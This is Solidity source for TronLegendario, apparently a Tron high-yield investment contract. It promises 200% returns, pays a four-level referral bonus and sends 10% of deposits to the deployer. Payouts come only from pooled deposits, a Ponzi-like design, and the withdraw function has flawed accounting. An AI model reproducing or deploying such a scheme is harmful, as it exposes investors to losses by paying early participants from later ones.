//SourceUnit: SafeMath.sol

pragma solidity ^0.5.14;

library SafeMath {

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

}

//SourceUnit: TronLegendario.sol

pragma solidity ^0.5.14;

import "./SafeMath.sol";

contract TronLegendario {
  using SafeMath for uint;
 
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    bool recompensa;
    address sponsor;
    Referer[] referers;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint public MIN_DEPOSIT = 200 trx;
  uint public MIN_RETIRO = 50 trx;

  uint public RETIRO_DIARIO = 100000 trx;
  uint public ULTIMO_REINICIO;

  address payable public marketing;
  address public NoValido;

  uint[4] public porcientos = [5, 3, 2, 1];
  
  uint[5] public tiempo = [ 100 * 28800, 66 * 28800, 50 * 28800, 40 * 28800, 33 * 28800];
  uint[5] public porcent = [ 200, 200, 200, 200, 200];

  uint public paso = 7000000 trx;
  uint public tarifa = 0;
  
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;


  mapping (address => Investor) public investors;
  
  constructor() public {
    marketing = msg.sender;
    investors[msg.sender].registered = true;
    investors[msg.sender].sponsor = marketing;

    ULTIMO_REINICIO = block.number;

    totalInvestors++;
    

  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }

  function InContract() public view returns (uint){
    return address(this).balance;
  }
  
  function setTarifa() internal returns(uint){
      
      if(InContract() < paso){
          tarifa = 0;
      }
      
      if(InContract() >= paso && InContract() < 2*paso){
          tarifa = 1;
      }
      
      if(InContract() >= 2*paso && InContract() < 3*paso){
          tarifa = 2;
      }

      if(InContract() >= 3*paso && InContract() < 4*paso){
          tarifa = 3;
      }
      
      if(InContract() >= 4*paso ){
          tarifa = 4;
      }
      
      return tarifa;
      
  }

  function setmarketing(address payable _marketing) public returns (address){
    require (msg.sender == marketing, "You are not marketing");
    require (_marketing != marketing, "You are already registered");

    marketing = _marketing;
    investors[marketing].registered = true;
    investors[marketing].sponsor = marketing;

    totalInvestors++;

    return marketing;
  }
  

  function column (address yo) public view returns(address[4] memory res) {

    res[0] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[1] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[2] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[3] = investors[yo].sponsor;

    return res;
  }

  function rewardReferers(address yo, uint amount) internal {

    address[4] memory referi = column(yo);
    uint[4] memory a;
    uint[4] memory b;

    for (uint i = 0; i < 4; i++) {
      if (investors[referi[i]].registered && referi[i] != marketing ) {

        if ( investors[referi[i]].recompensa ){
          b[i] = porcientos[i];
          a[i] = amount.mul(b[i]).div(100);

          investors[referi[i]].balanceRef += a[i];
          investors[referi[i]].totalRef += a[i];
          totalRefRewards += a[i];
        }
     
      }else{

        b[i] = porcientos[i];
        a[i] = amount.mul(b[i]).div(100);

        investors[referi[i]].balanceRef += a[i];
        investors[referi[i]].totalRef += a[i];
        totalRefRewards += a[i];
        
        break;
      }
    }
    
    
  }
  
  
  function deposit(address _sponsor) external payable {
    require ( msg.value >= MIN_DEPOSIT, "Send more TRX");

    setTarifa();

    if (!investors[msg.sender].registered){

      investors[msg.sender].registered = true;
      investors[msg.sender].sponsor = _sponsor;
    }

    if ( _sponsor == investors[msg.sender].sponsor ){

      investors[msg.sender].deposits.push(Deposit(tarifa, msg.value, block.number));

      if (!investors[msg.sender].recompensa){

        investors[msg.sender].recompensa = true;
        totalInvestors++;

      }
      
      investors[msg.sender].invested += msg.value;
      totalInvested += msg.value;
      
      marketing.transfer(msg.value.mul(10).div(100));

      rewardReferers(msg.sender, msg.value);

      reInicio();

    }

  }

  
  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff];
      uint porcientD = porcent[dep.tariff];
      
      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }


  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff];
      uint porcientD = porcent[dep.tariff];
      
      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;

  }

  function reInicio() public {

    uint hora = ULTIMO_REINICIO + 1*28800;

    if ( block.number >= hora ){

      RETIRO_DIARIO = 100000 trx;
      ULTIMO_REINICIO = hora;

    }
    
  }
  
  
  function withdraw() external {

    uint amount = withdrawable(msg.sender);
    amount = amount+investors[msg.sender].balanceRef;
    reInicio();

    require ( InContract() >= amount, "The contract has no balance");
    require ( amount >= MIN_RETIRO, "The minimum withdrawal limit reached");
    require ( RETIRO_DIARIO >= amount, "Global daily withdrawal limit reached");

    profit();

    uint amount20 = amount.mul(20).div(100);
    uint amount70 = amount.mul(70).div(100);

    if ( msg.sender.send(amount70) ) {

      RETIRO_DIARIO -= amount;

      investors[msg.sender].withdrawn += amount70;
      investors[msg.sender].invested += amount20;
      
      investors[msg.sender].deposits.push(Deposit(tarifa, amount20, block.number));
      
      totalInvested += amount20;
    
    }
    
  }

  function () external payable {}  
  
}